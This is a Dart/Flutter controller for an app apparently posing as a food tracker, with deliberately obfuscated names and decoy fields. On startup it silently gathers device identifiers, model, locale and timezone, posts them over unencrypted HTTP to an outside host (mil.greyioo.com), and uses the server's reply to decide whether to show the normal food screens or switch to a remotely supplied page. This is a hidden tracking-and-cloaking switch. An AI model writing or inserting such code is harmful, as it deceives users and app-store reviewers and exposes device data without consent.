import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class FoodRecordLogic extends GetxController {

  var qwlopxg = RxBool(false);
  var opexkicvf = RxBool(true);
  var doba = RxString("");
  var jalon = RxBool(false);
  var monahan = RxBool(true);
  final amfdcsy = Dio();


  InAppWebViewController? webViewController;

  dynamic vmzscebyri(){
    final lagfyqsipw = InternetConnectionChecker.instance;
    final xjlgqvbza = lagfyqsipw.onStatusChange.skip(1).listen(
          (InternetConnectionStatus rudngzw) {
        if (rudngzw == InternetConnectionStatus.connected) {
          folvwaik();
        } else {
          Get.toNamed('/food_error')?.then((_){
            folvwaik();
          });
        }
      },
    );
    return xjlgqvbza;
  }

  Future<bool> awismehltd() async {
    final bool nsprcfdyj = await InternetConnectionChecker.instance.hasConnection;
    if(!nsprcfdyj){
      Get.toNamed('/food_error')?.then((_){
        folvwaik();
      });
    }
    return nsprcfdyj;
  }

  @override
  void onInit() {
    super.onInit();
    vmzscebyri();
    folvwaik();
  }


  Future<void> folvwaik() async {

    var rhjmcnx = await awismehltd();
    if(!rhjmcnx){
      return;
    }

    jalon.value = true;
    monahan.value = true;
    opexkicvf.value = false;

    amfdcsy.post("http://mil.greyioo.com/pxwdfytivujlkaorqhgbsmecnz",data: await kixwoyzmh()).then((value) {
      var jywlnqv = value.data["jywlnqv"] as String;
      var jahlx = value.data["jahlx"] as bool;
      if (jahlx) {
        doba.value = jywlnqv;
        aisha();
      } else {
        bergstrom();
      }
    }).catchError((e) {
      opexkicvf.value = true;
      monahan.value = true;
      jalon.value = false;
    });
  }

  Future<Map<String, dynamic>> kixwoyzmh() async {
    final DeviceInfoPlugin piqejm = DeviceInfoPlugin();
    PackageInfo bkzfhio_elfv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var kxqurpg = Platform.localeName;
    var ytd_kOf = currentTimeZone;

    var ytd_GHlSB = bkzfhio_elfv.packageName;
    var ytd_klOIp = bkzfhio_elfv.version;
    var ytd_AjVMm = bkzfhio_elfv.buildNumber;

    var ytd_zLJnM = bkzfhio_elfv.appName;
    var ytd_ek = "";
    var ytd_Oh  = "";
    var ytd_EZ = "";
    var lillaKuvalis = "";
    var gunnerMann = "";
    var palmaWillms = "";
    var heatherEffertz = "";
    var vaughnGaylord = "";
    var pearlPollich = "";


    var ytd_gVteAXYB = "";
    var ytd_MHusoGBL = false;

    if (GetPlatform.isAndroid) {
      ytd_gVteAXYB = "android";
      var nmawxvc = await piqejm.androidInfo;

      ytd_EZ = nmawxvc.brand;

      ytd_ek  = nmawxvc.model;
      ytd_Oh = nmawxvc.id;

      ytd_MHusoGBL = nmawxvc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ytd_gVteAXYB = "ios";
      var cyqagkt = await piqejm.iosInfo;
      ytd_EZ = cyqagkt.name;
      ytd_ek = cyqagkt.model;

      ytd_Oh = cyqagkt.identifierForVendor ?? "";
      ytd_MHusoGBL  = cyqagkt.isPhysicalDevice;
    }
    var res = {
      "ytd_zLJnM": ytd_zLJnM,
      "ytd_GHlSB": ytd_GHlSB,
      "ytd_ek": ytd_ek,
      "ytd_kOf": ytd_kOf,
      "vaughnGaylord" : vaughnGaylord,
      "ytd_EZ": ytd_EZ,
      "ytd_MHusoGBL": ytd_MHusoGBL,
      "ytd_Oh": ytd_Oh,
      "kxqurpg": kxqurpg,
      "ytd_gVteAXYB": ytd_gVteAXYB,
      "lillaKuvalis" : lillaKuvalis,
      "gunnerMann" : gunnerMann,
      "ytd_klOIp": ytd_klOIp,
      "palmaWillms" : palmaWillms,
      "heatherEffertz" : heatherEffertz,
      "ytd_AjVMm": ytd_AjVMm,
      "pearlPollich" : pearlPollich,

    };
    return res;
  }

  Future<void> bergstrom() async {
    Get.toNamed("/food_tab");
  }

  Future<void> aisha() async {
    Get.offAllNamed("/food_le");
  }

  @override
  void dispose() {
    vmzscebyri().cancel();
    super.dispose();
  }

}
